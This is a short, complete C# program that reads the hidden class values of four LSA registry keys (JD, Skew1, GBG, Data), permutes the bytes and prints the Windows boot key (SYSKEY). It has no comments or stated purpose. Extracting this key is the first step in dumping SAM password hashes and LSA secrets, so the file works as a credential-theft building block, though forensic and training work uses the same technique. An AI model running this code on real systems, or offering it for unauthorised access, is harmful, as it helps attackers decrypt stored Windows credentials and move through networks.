using System;
using System.Text;
using System.Runtime.InteropServices;
using Microsoft.Win32;

class Program
{
    const int BOOT_KEY_SIZE = 16;

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern int RegOpenKeyEx(IntPtr hKey, string lpSubKey, uint ulOptions, int samDesired, out IntPtr phkResult);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern int RegQueryInfoKey(IntPtr hKey, System.Text.StringBuilder lpClass, ref uint lpcbClass, IntPtr lpReserved, IntPtr lpcSubKeys, IntPtr lpcbMaxSubKeyLen, IntPtr lpcbMaxClassLen, IntPtr lpcValues, IntPtr lpcbMaxValueNameLen, IntPtr lpcbMaxValueLen, IntPtr lpcbSecurityDescriptor, IntPtr lptLastWriteTime);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern int RegCloseKey(IntPtr hKey);

    static void GetRegistryClassValue(IntPtr rootKey, string subKey, System.Text.StringBuilder classValue)
    {
        IntPtr hKey;
        int result = RegOpenKeyEx(rootKey, subKey, 0, 0x20019, out hKey); // KEY_READ = 0x20019
        if (result != 0)
        {
            Console.Error.WriteLine($"Error opening registry key: {result}");
            return;
        }

        uint classValueSize = (uint)classValue.Capacity;
        result = RegQueryInfoKey(hKey, classValue, ref classValueSize, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
        if (result != 0)
        {
            Console.Error.WriteLine($"Error querying registry key class: {result}");
        }
        Console.WriteLine($"{subKey}: {classValue}");
        RegCloseKey(hKey);
    }

    static void HexStringToByteArray(string hexString, byte[] byteArray, ref int offset)
    {
        for (int i = 0; i < hexString.Length / 2; ++i)
        {
            byteArray[offset++] = Convert.ToByte(hexString.Substring(i * 2, 2), 16);
        }
    }

    static void PrintByteArray(byte[] byteArray)
    {
        foreach (var b in byteArray)
        {
            Console.Write($"{b:X2}");
        }
        Console.WriteLine();
    }

    static void PermuteBootKey(byte[] bootKey)
    {
        byte[] temp = new byte[BOOT_KEY_SIZE];
        Array.Copy(bootKey, temp, BOOT_KEY_SIZE);

        int[] transforms = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };
        for (int i = 0; i < BOOT_KEY_SIZE; ++i)
        {
            bootKey[i] = temp[transforms[i]];
        }
    }

    static void Main()
    {
        string[] keys = { "JD", "Skew1", "GBG", "Data" };
        string basePath = @"SYSTEM\CurrentControlSet\Control\Lsa\";
        StringBuilder classValue = new StringBuilder(256);
        byte[] bootKey = new byte[BOOT_KEY_SIZE];
        int offset = 0;

        foreach (var key in keys)
        {
            string fullPath = basePath + key;
            GetRegistryClassValue(new IntPtr(unchecked((int)0x80000002)), fullPath, classValue); // HKEY_LOCAL_MACHINE = 0x80000002
            HexStringToByteArray(classValue.ToString(), bootKey, ref offset);
        }
        PermuteBootKey(bootKey);
        Console.Write("Boot key is: ");
        PrintByteArray(bootKey);
    }
}

